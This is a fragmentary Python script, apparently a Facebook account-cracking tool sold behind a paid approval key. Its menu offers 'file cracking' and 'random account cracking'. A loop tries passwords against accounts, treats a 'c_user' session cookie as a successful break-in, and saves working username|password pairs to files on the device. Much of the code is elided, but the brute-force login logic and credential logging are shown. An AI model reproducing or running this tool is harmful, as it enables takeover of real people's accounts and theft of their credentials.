...
def main_apv():
    ...
    try:
        ...
        print ("══════════════════════════════════════════════════")
        print ("")
        myid=uuid.uuid4().hex[:25].upper()
        print ("          YOUR KEY : "+ak+myid+sr)
        print ("══════════════════════════════════════════════════")
    ...
    if key1 in r1:
        ...
        print ("         ══════════════════════════════════════════════════")
        print ("             \033[1;32mGIVE ME [-100-] TAKA FOR APROVAL SHAKIL")     
        print ("             \033[1;32mYOUR KEY : "+ak+sr+key1)     
...
def R():
			...
			print(logo)
			print ('══════════════════════════════════════════════════')
			print("\033[1;33m[1]\033[1;92m ➟ \033[033m𝐒𝐓𝐀𝐑𝐓 𝐅𝐈𝐋𝐄 𝐂𝐑𝐀𝐂𝐊𝐈𝐍𝐆  : 𝐁𝐒𝐓 𝐌𝐄𝐓𝐇𝐎𝐃")
			print("\033[1;33m[2]\033[1;94m ➟ \033[033m𝐑𝐀𝐍𝐃𝐎𝐌 𝐀𝐂 𝐂𝐑𝐀𝐂𝐊𝐈𝐍𝐆   : 𝐁𝐒𝐓 𝐌𝐄𝐓𝐇𝐎𝐃")
			print("\033[1;33m[3]\033[1;97m ➟ \033[033m𝐂𝐎𝐍𝐓𝐀𝐂𝐓 → 𝐀𝐃𝐌𝐈𝐍      : 𝐌𝐃 𝐒𝐇𝐀𝐊𝐈𝐋 𝐈𝐒𝐋𝐀𝐌")
			print ('\033[1;92m══════════════════════════════════════════════════')
			key = input(" [*] Choose : ")
			print ('══════════════════════════════════════════════════')
			if key in [""]:
				...
				os.system("xdg-open https://www.facebook.com/mert.buber.92")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [SCANNING-OK 💥] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/SCANNING-OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/SCANNING-CP.txt' , 'a').write('%s\n' % wrt)
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+8801608530664")
	time.sleep(3)
	R()
def yt():
	logo()
